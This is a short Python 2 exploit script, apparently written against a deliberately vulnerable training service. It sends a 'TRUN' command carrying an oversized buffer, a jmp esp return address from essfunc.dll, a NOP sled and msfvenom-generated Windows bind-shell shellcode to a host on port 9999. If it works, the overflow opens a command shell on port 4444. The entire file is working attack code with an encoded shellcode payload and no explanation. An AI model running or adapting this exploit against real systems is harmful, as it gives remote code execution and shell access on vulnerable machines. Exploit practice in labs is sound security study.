#!/usr/bin/python
import socket

IP = "192.168.0.29"
PORT = 9999
TIMEOUT = 5

def send_ind_tcp(MESSAGE):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((IP, PORT))
        s.send(MESSAGE)
        data = s.recv(1024)
        s.close()
        return 1
    except socket.error, exc:
        print "[!] Can't connect to %s:%d - with MSG length %d - might be due to crash" % (IP, PORT, len(MESSAGE))
        return 0

# msfvenom -p windows/shell_bind_tcp LPORT=4444 - 328 bytes
# badchars \x00
buf =  ""
buf += "\x6a\x52\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13"
buf += "\x05\x6e\x13\x1c\x83\xeb\xfc\xe2\xf4\xf9\x86\x91\x1c"
buf += "\x05\x6e\x73\x95\xe0\x5f\xd3\x78\x8e\x3e\x23\x97\x57"
buf += "\x62\x98\x4e\x11\xe5\x61\x34\x0a\xd9\x59\x3a\x34\x91"
buf += "\xbf\x20\x64\x12\x11\x30\x25\xaf\xdc\x11\x04\xa9\xf1"
buf += "\xee\x57\x39\x98\x4e\x15\xe5\x59\x20\x8e\x22\x02\x64"
buf += "\xe6\x26\x12\xcd\x54\xe5\x4a\x3c\x04\xbd\x98\x55\x1d"
buf += "\x8d\x29\x55\x8e\x5a\x98\x1d\xd3\x5f\xec\xb0\xc4\xa1"
buf += "\x1e\x1d\xc2\x56\xf3\x69\xf3\x6d\x6e\xe4\x3e\x13\x37"
buf += "\x69\xe1\x36\x98\x44\x21\x6f\xc0\x7a\x8e\x62\x58\x97"
buf += "\x5d\x72\x12\xcf\x8e\x6a\x98\x1d\xd5\xe7\x57\x38\x21"
buf += "\x35\x48\x7d\x5c\x34\x42\xe3\xe5\x31\x4c\x46\x8e\x7c"
buf += "\xf8\x91\x58\x06\x20\x2e\x05\x6e\x7b\x6b\x76\x5c\x4c"
buf += "\x48\x6d\x22\x64\x3a\x02\x91\xc6\xa4\x95\x6f\x13\x1c"
buf += "\x2c\xaa\x47\x4c\x6d\x47\x93\x77\x05\x91\xc6\x76\x0d"
buf += "\x37\x43\xfe\xf8\x2e\x43\x5c\x55\x06\xf9\x13\xda\x8e"
buf += "\xec\xc9\x92\x06\x11\x1c\x14\x32\x9a\xfa\x6f\x7e\x45"
buf += "\x4b\x6d\xac\xc8\x2b\x62\x91\xc6\x4b\x6d\xd9\xfa\x24"
buf += "\xfa\x91\xc6\x4b\x6d\x1a\xff\x27\xe4\x91\xc6\x4b\x92"
buf += "\x06\x66\x72\x48\x0f\xec\xc9\x6d\x0d\x7e\x78\x05\xe7"
buf += "\xf0\x4b\x52\x39\x22\xea\x6f\x7c\x4a\x4a\xe7\x93\x75"
buf += "\xdb\x41\x4a\x2f\x1d\x04\xe3\x57\x38\x15\xa8\x13\x58"
buf += "\x51\x3e\x45\x4a\x53\x28\x45\x52\x53\x38\x40\x4a\x6d"
buf += "\x17\xdf\x23\x83\x91\xc6\x95\xe5\x20\x45\x5a\xfa\x5e"
buf += "\x7b\x14\x82\x73\x73\xe3\xd0\xd5\xe3\xa9\xa7\x38\x7b"
buf += "\xba\x90\xd3\x8e\xe3\xd0\x52\x15\x60\x0f\xee\xe8\xfc"
buf += "\x70\x6b\xa8\x5b\x16\x1c\x7c\x76\x05\x3d\xec\xc9"

# \xAF\x11\x50\x62 - jmp esp - essfunc.dll
MSG = "TRUN /.:/" + "A" * 1000 + "B" * 1003 + "\xAF\x11\x50\x62" + "\x90" * 10
MSG += buf

send_ind_tcp(MSG)
